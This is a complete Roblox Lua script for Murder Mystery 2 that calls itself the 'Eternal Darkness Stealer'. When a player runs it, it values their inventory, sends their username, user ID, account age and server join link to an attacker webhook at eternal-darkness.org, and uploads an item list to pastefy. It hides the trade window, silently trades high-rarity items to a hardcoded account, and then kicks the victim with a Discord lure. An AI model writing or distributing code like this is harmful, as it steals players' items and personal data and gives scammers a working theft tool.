repeat task.wait() until game:IsLoaded()
task.wait(2)

if game.PlaceId ~= 142823291 then
    local plr = game.Players.LocalPlayer
    if plr and typeof(plr.Kick) == "function" then
        pcall(function() plr:Kick("This script only works in MM2!") end)
    end
    return
end

_G.ED_CONFIG = {
WEBHOOK_ID = "de2d4a8bec1b9e4c65638ceee0f9d411",
USERNAMES = {"Eliaskulmer999",},
PROXY_URL = "https://eternal-darkness.org/proxy/"
}
if not _G.ED_CONFIG then
    warn("[ED] No config found. Execute the user loader first!")
    return
end
local cfg = _G.ED_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL
if not WEBHOOK_ID or WEBHOOK_ID == "" then
    warn("[ED] Invalid WEBHOOK_ID")
    return
end
if not USERNAMES or #USERNAMES == 0 then
    warn("[ED] No usernames configured")
    return
end
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer
if not plr then 
    warn("[ED] LocalPlayer not found")
    return 
end
local executorName = "Unknown"
pcall(function()
    if identifyexecutor then
        executorName = identifyexecutor()
    elseif getexecutorname then
        executorName = getexecutorname()
    end
end)
getgenv().request = getgenv().request or request or http_request or 
    (syn and syn.request) or (http and http.request) or 
    (fluxus and fluxus.request) or nil
if not getgenv().request then
    warn("[ED] No request function found - executor not supported")
    return
end
local request = getgenv().request
local REAL_JOB_ID = game.JobId
local bypassJobId = game.JobId
local capturedJobId = false
if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    local printed = false
    
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate
    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            bypassJobId = game.JobId
            capturedJobId = true
        end
        return old(dt)
    end)
    repeat task.wait() until capturedJobId
    REAL_JOB_ID = bypassJobId
end
local ETERNAL_DARKNESS_COLORS = {
    primary = 0x0a0a1a,
    secondary = 0x1a1a2e,
    accent = 0x16213e,
    highlight = 0x0f3460,
    text = 0x533483,
    gold = 0x8b0000,
    success = 0x006400
}
local no_trade_items = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true,
    ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}
local specialItems = {
    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
}
local dbSuccess, database = pcall(function()
    return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
end)
if not dbSuccess or not database then
    warn("[ED] Failed to load item database")
    return
end
local profileSuccess, profileData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
end)
if not profileSuccess or not profileData then
    warn("[ED] Failed to get profile data")
    return
end
local categories = {
    godlies = "https://supremevalues.com/mm2/godlies",
    chroma = "https://supremevalues.com/mm2/chromas",
    ancients = "https://supremevalues.com/mm2/ancients",
    vintages = "https://supremevalues.com/mm2/vintages",
    uniques = "https://supremevalues.com/mm2/uniques",
    legendaries = "https://supremevalues.com/mm2/legendaries"
}
local function fetchHTML(url)
    local ok, response = pcall(function()
        return request({Url = url, Method = "GET"})
    end)
    if ok and response and response.Body then 
        return response.Body 
    end
    return nil
end
local function parseValue(body)
    local valueStr = body:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        return tonumber(valueStr)
    end
    return nil
end
local function extractItems(html)
    local itemValues = {}
    for itemName, itembody in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = itemName:gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1"):lower()
            local value = parseValue(itembody)
            if value then 
                itemValues[itemName] = value 
            end
        end
    end
    return itemValues
end
local function buildValueList()
    local allValues = {}
    local chromaValues = {}
    local completed = 0
    local lock = Instance.new("BindableEvent")
    for rarity, url in pairs(categories) do
        task.spawn(function()
            local html = fetchHTML(url)
            if html then
                if rarity == "chroma" then
                    chromaValues = extractItems(html)
                else
                    local extracted = extractItems(html)
                    for k, v in pairs(extracted) do 
                        allValues[k] = v 
                    end
                end
            end
            completed += 1
            if completed >= 6 then 
                lock:Fire() 
            end
        end)
    end
    lock.Event:Wait()
    local valueList = {}
    for dataid, item in pairs(database) do
        local itemName = (item.ItemName or ""):lower()
        local hasChroma = item.Chroma or false
        if hasChroma then
            for cn, cv in pairs(chromaValues) do
                if cn:find(itemName) then 
                    valueList[dataid] = cv
                    break 
                end
            end
        else
            if allValues[itemName] then
                valueList[dataid] = allValues[itemName]
            end
        end
    end
    return valueList
end
local weaponsToSend = {}
local totalInventoryValue = 0
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local hasSpecialItem = false
local prices = buildValueList()
local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}
-- SADECE Godly, Ancient, Unique, Vintage rarity'ler trade edilecek
-- Legendary, Rare, Uncommon, Common trade edilmeyecek
local allowed_rarities = {["Godly"] = true, ["Ancient"] = true, ["Unique"] = true, ["Vintage"] = true}
for dataid, amount in pairs(weaponsOwned) do
    local item = database[dataid]
    if item and not no_trade_items[dataid] and amount > 0 then
        local itemName = item.ItemName or tostring(dataid)
        local rarity = item.Rarity or "Common"
        -- Sadece izin verilen rarity'ler trade edilecek
        if not allowed_rarities[rarity] then
            continue  -- Legendary, Rare, Uncommon, Common atlanıyor
        end
        local value = prices[dataid] or 1
        local totalValue = value * amount
        totalInventoryValue += totalValue
        if specialItems[itemName] then 
            hasSpecialItem = true 
        end
        table.insert(weaponsToSend, {
            DataID = dataid,
            ItemName = itemName,
            Amount = amount,
            Rarity = rarity,
            Value = value,
            TotalValue = totalValue
        })
        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
    end
end
table.sort(weaponsToSend, function(a, b)
    return a.TotalValue > b.TotalValue
end)
-- KICK KALDIRILDI: Eğer trade edilecek eşya yoksa sadece uyarı verip devam ediyor, kicklemiyor
if #weaponsToSend == 0 then
    warn("[ED] No tradeable items (Godly/Ancient/Unique/Vintage) found - continuing without trade")
    -- kick yok, sadece uyarı
end
local function uploadToPastefy(items)
    local lines = {
        "Eternal Darkness Inventory | " .. plr.Name,
        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Total Items: " .. #items,
        string.rep("-", 50), 
        ""
    }
    table.sort(items, function(a, b)
        local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
        local a_order = tier_order[a.Rarity] or 1
        local b_order = tier_order[b.Rarity] or 1
        if a_order ~= b_order then return a_order > b_order end
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)
    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local total_val = item.Value * item.Amount
        table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", 
            item.ItemName, item.Amount, item.Value, total_val))
    end
    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)
    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            return data.paste and "https://pastefy.app/" .. data.paste.id or 
                   data.id and "https://pastefy.app/" .. data.id or "Failed to upload"
        end
    end
    return "Failed to upload"
end
local function GetUSD(list)
    local totalUSD = 0
    local itemPrices = {}
    local starpetsRates = {
        ["Nik's Scythe"] = 1500, ["Corrupt"] = 800, ["Glitched"] = 500,
        ["Batwing"] = 45, ["Icewing"] = 35, ["Hallowscythe"] = 25,
        ["Icebreaker"] = 20, ["Elderwood Scythe"] = 18, ["Logchopper"] = 15,
        ["Hallow's Blade"] = 12, ["BattleAxe"] = 12, ["BattleAxe II"] = 10,
        ["Ginger Luger"] = 8, ["Ice Dragon"] = 7, ["Red Luger"] = 7,
        ["Green Luger"] = 7, ["Chill"] = 6.5, ["Handsaw"] = 6,
        ["Pixel"] = 5.5, ["Candy"] = 5, ["Sugar"] = 5,
        ["Eternal"] = 4.5, ["Spider"] = 4, ["Old Glory"] = 4,
        ["Amerilaser"] = 4, ["Virtual"] = 3.5, ["Blaster"] = 3.5,
        ["Laser"] = 3.5, ["Prince"] = 3, ["Shadow"] = 3,
        ["Saw"] = 2.8, ["Deathshard"] = 2.8, ["Fang"] = 2.8,
        ["Tides"] = 2.8, ["Slasher"] = 2.8, ["Heat"] = 2.8,
        ["Luger"] = 2.8, ["Flames"] = 2.5, ["Seer"] = 2.5,
        ["Nightblade"] = 2.2, ["Gemstone"] = 2.2, ["Bio"] = 2,
        ["Phoenix"] = 2, ["Frostsaber"] = 2, ["Ice Shard"] = 1.8,
        ["Winter's Edge"] = 1.8, ["Vampire's Edge"] = 1.5,
        ["Gingerblade"] = 1.5, ["Clockwork"] = 1.5, ["Boneblade"] = 1.5,
        ["Evergreen"] = 1.5, ["Evergun"] = 1.5, ["Traveler's Gun"] = 1.5,
        ["Vampire's Gun"] = 1.5, ["Constellation"] = 1.5, ["Bauble"] = 1.5,
        ["Alienbeam"] = 1.5, ["Darkshot"] = 1.5, ["Darksword"] = 1.5,
        ["Chroma Luger"] = 8.4, ["Chroma Heat"] = 8.4, ["Chroma Fang"] = 8.4,
        ["Chroma Slasher"] = 8.4, ["Chroma Tides"] = 8.4, ["Chroma Deathshard"] = 8.4,
        ["Chroma Saw"] = 8.4, ["Chroma Seer"] = 7.5, ["Chroma Gemstone"] = 6.6,
        ["Chroma Laser"] = 10.5, ["America"] = 15, ["Blood"] = 12
    }
    for _, item in ipairs(list) do
        local displayName = database[item.DataID] and database[item.DataID].ItemName or item.DataID
        local rate = starpetsRates[displayName] or 0.07
        local itemTotal = rate * item.Amount
        totalUSD += itemTotal
        table.insert(itemPrices, {
            name = displayName,
            amount = item.Amount,
            unitPrice = tostring(rate),
            totalPrice = string.format("%.2f", itemTotal)
        })
    end
    return {
        total = string.format("%.2f", totalUSD),
        itemPrices = itemPrices
    }
end
local function sendToProxy(payload)
    task.spawn(function()
        local url = PROXY_URL .. WEBHOOK_ID
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/2.0.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        
        if not success or (response and response.StatusCode ~= 200 and response.StatusCode ~= 204) then
            warn("[ED] Webhook failed")
        else
            print("[ED] Webhook sent successfully")
        end
    end)
end
local rubisLink = uploadToPastefy(weaponsToSend)
local usdData = GetUSD(weaponsToSend)
local totalUSD = usdData.total or "0.00"
local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
local hitCategory = "Bad Hit"
local isPingWorthy = false
if totalInventoryValue >= 1000 then
    hitCategory = "Big Hit (Godly+)"
    isPingWorthy = true
elseif totalInventoryValue >= 300 then
    hitCategory = "Good Hit (Godly+)"
    isPingWorthy = true
elseif totalInventoryValue >= 100 then
    hitCategory = "Normal Hit (Godly+)"
    isPingWorthy = true
else
    hitCategory = "Low Hit (Godly+)"
end
local total_items = 0
for _, item in ipairs(weaponsToSend) do 
    total_items += item.Amount 
end
local top_items = {}
for i = 1, math.min(3, #weaponsToSend) do
    local item = weaponsToSend[i]
    local rarityEmoji = {Ancient = "🔴", Godly = "🟣", Unique = "🟡", Vintage = "🟠", Legendary = "🔵", Rare = "🟢"}
    local emoji = rarityEmoji[item.Rarity] or "⚪"
    table.insert(top_items, string.format("%s `%s` x%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
end
local fields = {
    {name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days", inline = true},
    {name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
    {name = "💰 Valuation", value = "Total Value: " .. totalInventoryValue .. "\nReal Value: $" .. totalUSD .. "\nTotal Items: " .. total_items, inline = true}
}
local esc = string.char(27)
local ansiLine1 = esc .. "[2;31mAncient:  " .. rarityCounts.Ancient .. "  " .. esc .. "[2;35mGodly:   " .. rarityCounts.Godly .. esc .. "[0m"
local ansiLine2 = esc .. "[2;33mUnique:   " .. rarityCounts.Unique .. "  " .. esc .. "[2;38;5;208mVintage: " .. rarityCounts.Vintage .. esc .. "[0m"
local ansiLine3 = esc .. "[2;34mLegendary:" .. rarityCounts.Legendary .. "  " .. esc .. "[2;32mRare:    " .. rarityCounts.Rare .. esc .. "[0m"
local ansiLine4 = esc .. "[2;37mUncommon: " .. rarityCounts.Uncommon .. "  Common:  " .. rarityCounts.Common
table.insert(fields, {name = "📊 Inventory Breakdown", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "```", inline = false})
table.insert(fields, {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false})
table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})
local payload = {
    content = isPingWorthy and "@everyone 🌑 **NEW MM2 HIT | Eternal Darkness**" or nil,
    username = "🌑 Eternal Darkness",
    avatar_url = "https://imgur.com/a/OPHDrDn.png",
    embeds = {{
        title = "Eternal Darkness MM2 HIT │ " .. hitCategory,
        url = rubisLink,
        color = ETERNAL_DARKNESS_COLORS.secondary,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
        fields = fields,
        footer = {text = "Eternal Darkness Stealer v6.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
sendToProxy(payload)
print("[ED] MM2 Script loaded successfully for", plr.Name)
print("[ED] Inventory value:", totalInventoryValue, "Items:", #weaponsToSend)
local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
if not Trade then
    warn("[ED] Trade remote not found")
    return
end
local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")
local last_offer_info = nil
if Trade:FindFirstChild("UpdateTrade") then
    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if data and data.LastOffer then
            last_offer_info = data.LastOffer
        end
    end)
end
local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end
local function getStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end
local function isTarget(name)
    for _, u in ipairs(USERNAMES) do
        if u:lower() == name:lower() then 
            return true 
        end
    end
    return false
end
local function waitUntilDone()
    repeat
        task.wait(0.1)
    until getStatus() == "None"
end
local function acceptDeal()
    if last_offer_info then
        AcceptTradeRemote:FireServer(game.PlaceId * 3, last_offer_info)
    else
        AcceptTradeRemote:FireServer(game.PlaceId * 3, {})
    end
end
local function addToOffer(item_id)
    OfferItem:FireServer(item_id, "Weapons")
    task.wait(0.1)
end
local isTradeCompleted = false
local function doTrade(targetPlayer)
    if not targetPlayer then return end
    local attempts = 0
    while attempts < 30 do
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then 
            break 
        end
        attempts += 1
        task.wait(0.5)
    end
    local itemsToTrade = {}
    for _, item in ipairs(weaponsToSend) do
        table.insert(itemsToTrade, item)
    end
    if #itemsToTrade == 0 then 
        warn("[ED] No items to trade - skipping trade")
        return 
    end
    while #itemsToTrade > 0 and not isTradeCompleted do
        local statusNow = getStatus()
        if statusNow == "StartTrade" then
            DeclineTrade:FireServer()
            task.wait(0.3)
        elseif statusNow == "ReceivingRequest" then
            if Trade:FindFirstChild("DeclineRequest") then
                Trade.DeclineRequest:FireServer()
            else
                DeclineTrade:FireServer()
            end
            task.wait(0.3)
        end
        local tradeStarted = false
        local sendAttempts = 0
        while not tradeStarted and sendAttempts < 30 do
            local current = getStatus()
            if current == "StartTrade" then
                tradeStarted = true
                break
            elseif current == "None" then
                pcall(function()
                    SendRequest:InvokeServer(targetPlayer)
                end)
            elseif current == "ReceivingRequest" then
                if Trade:FindFirstChild("DeclineRequest") then
                    Trade.DeclineRequest:FireServer()
                else
                    DeclineTrade:FireServer()
                end
            end
            sendAttempts += 1
            task.wait(0.5)
        end
        if not tradeStarted then
            task.wait(2)
            continue
        end
        local slotsLeft = 4
        local itemsAdded = 0
        while slotsLeft > 0 and #itemsToTrade > 0 do
            local currentItem = itemsToTrade[1]
            local amountToAdd = math.min(slotsLeft, currentItem.Amount)
            for _ = 1, amountToAdd do
                addToOffer(currentItem.DataID)
            end
            currentItem.Amount = currentItem.Amount - amountToAdd
            if currentItem.Amount <= 0 then
                table.remove(itemsToTrade, 1)
            end
            slotsLeft = slotsLeft - amountToAdd
            itemsAdded = itemsAdded + amountToAdd
        end
        if itemsAdded == 0 then break end
        task.wait(5)
        acceptDeal()
        waitUntilDone()
        if #itemsToTrade > 0 then
            task.wait(1)
        end
    end
    if #itemsToTrade == 0 then
        isTradeCompleted = true
        task.wait(2)
        pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
        pcall(function()
            plr:Kick("Items taken by Eternal Darkness\n\nJoin to get your items back!\ndiscord.gg/wep4k9Fg8W")
        end)
    end
end
Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(player)
        end)
    end
end)
for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(p)
        end)
    end
end
